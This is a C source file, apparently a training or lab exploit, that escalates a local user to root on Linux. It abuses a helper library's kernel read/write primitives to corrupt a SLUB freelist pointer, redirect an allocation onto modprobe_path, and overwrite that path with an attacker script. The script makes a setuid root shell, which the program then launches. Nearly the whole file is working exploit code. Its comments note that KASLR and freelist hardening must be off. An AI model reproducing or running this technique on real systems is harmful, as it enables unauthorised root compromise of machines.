#include <stdio.h>
#include "../../kernel/KRWX/client/lib/krwx.h"

/* 
 * For the expected result it is necessary to have FREELIST_[RANDOM|HARDENED] disabled and KASLR disabled as well (nokaslr option)
 * `su - user; run` for a "realistic" experience
 */

void prep_exploit(){
  // Create SUID binary
  system("echo 'int main(void){setgid(0); setuid(0); execl(\"/bin/sh\",\"sh\",0);}' > /tmp/suid.c");
  system("gcc -w /tmp/suid.c -o /tmp/suid -static");

  // Setup 
  system("echo '#!/bin/sh' > /tmp/x");
  system("echo 'touch /tmp/pwneed' >> /tmp/x");
  system("echo 'chown root: /tmp/suid' >> /tmp/x");
  system("echo 'chmod 777 /tmp/suid' >> /tmp/x");
  system("echo 'chmod u+s /tmp/suid' >> /tmp/x");
  system("echo -e '\xdd\xdd\xdd\xdd\xdd\xdd' > /tmp/nnn");
  system("chmod +x /tmp/x");
  system("chmod +x /tmp/nnn");
}

void get_root_shell(){
  system("/tmp/nnn 2>/dev/null");
  system("/tmp/suid 2>/dev/null");
}

int main(){
#define CHUNK_SZ 64
  // Fill partial slabs
  prep_exploit();
  for(int i = 0; i < 1000; i++)
    kmalloc(CHUNK_SZ, GFP_KERNEL);

  void* chunk_A = kmalloc(CHUNK_SZ, GFP_KERNEL);
  kfree(chunk_A);
  printf("[*] chunk_A (@%p) has been allocated and freed\n", chunk_A);
  read_memory(chunk_A, CHUNK_SZ);
  void* chunk_A_freelist_ptr = chunk_A + (CHUNK_SZ/2);
  printf("[*] The chunk_A freelist pointer is corrupted with the address of modprobe_path (KASLR not enabled)\n");

  /* 
     gefâž¤  p &modprobe_path
     $2 = (char (*)[256]) 0xffffffff82b3fb80 <modprobe_path>
     */
  void* modprobe_path_ptr = 0xffffffff82b3fb80;
  kwrite64(chunk_A_freelist_ptr, modprobe_path_ptr);
  kmalloc(CHUNK_SZ, GFP_KERNEL);
  void* chunk_B = kmalloc(CHUNK_SZ, GFP_KERNEL);
  if( chunk_B == modprobe_path_ptr )
    printf("[+] Success!\n");

  // Overwrite modprobe_path with /tmp/x (script that we control)
  // by writing into chunk_B
  // 0x00782f706d742f == "/tmp/x" in little-endian

  printf("[*] By writing into chunk_B, we arbitrary write into &modprobe_path\n");
  kwrite64(chunk_B, 0x00782f706d742f);

  get_root_shell();

}
